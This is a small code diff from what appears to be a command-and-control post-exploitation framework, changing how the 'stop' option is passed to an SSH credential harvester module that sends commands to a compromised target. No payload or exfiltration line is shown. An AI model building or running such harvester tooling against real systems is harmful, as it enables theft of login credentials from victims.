@@ -30,7 +30,7 @@ func module_ssh_harvester() {
 	stop_opt, ok := CurrentModuleOptions["stop"]
 	if ok {
 		if stop_opt.Val == "yes" {
-			cmd += " --stop"
+			cmd = fmt.Sprintf("%s --stop", emp3r0r_def.C2CmdSSHHarvester)
 		}
 	}
 	err := SendCmdToCurrentTarget(cmd, "")
